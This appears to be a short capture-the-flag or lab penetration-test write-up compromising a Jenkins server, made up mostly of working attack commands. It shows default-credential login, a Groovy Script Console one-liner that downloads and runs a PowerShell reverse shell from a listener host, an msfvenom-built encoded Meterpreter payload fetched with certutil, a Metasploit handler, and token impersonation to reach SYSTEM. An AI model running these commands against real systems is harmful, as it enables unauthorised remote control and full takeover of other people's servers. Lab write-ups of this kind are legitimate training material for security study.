# 🎯 Penetration Test Write-Up

## Target: Jenkins Server

---

## 1. Initial Access

**Credentials found:** `admin:admin`

Accessed Jenkins Script Console and executed Groovy reverse shell:

```groovy
def proc = ["powershell", "-c", "IEX(New-Object Net.WebClient).DownloadString('http://10.48.96.187:8000/Invoke-PowerShellTcp.ps1'); Invoke-PowerShellTcp -Reverse -IPAddress 10.48.96.187 -Port 4444"].execute()
```

**Result:** PowerShell shell obtained

---

## 2. Payload Delivery

Generated Meterpreter payload:

```bash
msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.48.83.177 LPORT=4445 -f exe -o shell.exe
```

Delivered via:
```powershell
certutil -urlcache -f http://10.48.83.177:8000/shell.exe shell.exe
```

---

## 3. Meterpreter Session

```bash
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 10.48.83.177
set LPORT 4445
exploit
```

**Result:** Meterpreter session established

---

## 4. Privilege Escalation

Checked privileges — **SeDebugPrivilege** enabled.

```
meterpreter > load incognito
meterpreter > list_tokens -g
```

Found `BUILTIN\Administrators` token available.

```
meterpreter > impersonate_token "BUILTIN\Administrators"
```

Migrated to SYSTEM process:

```
meterpreter > migrate 692
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

---

## 5. Summary

| Stage | Action | Result |
|-------|--------|--------|
| Recon | Found Jenkins | admin:admin |
| RCE | Groovy Console | PowerShell shell |
| Persistence | Meterpreter payload | Stable session |
| PrivEsc | Token Impersonation | **NT AUTHORITY\SYSTEM** |

---

**🏆 Rooted!**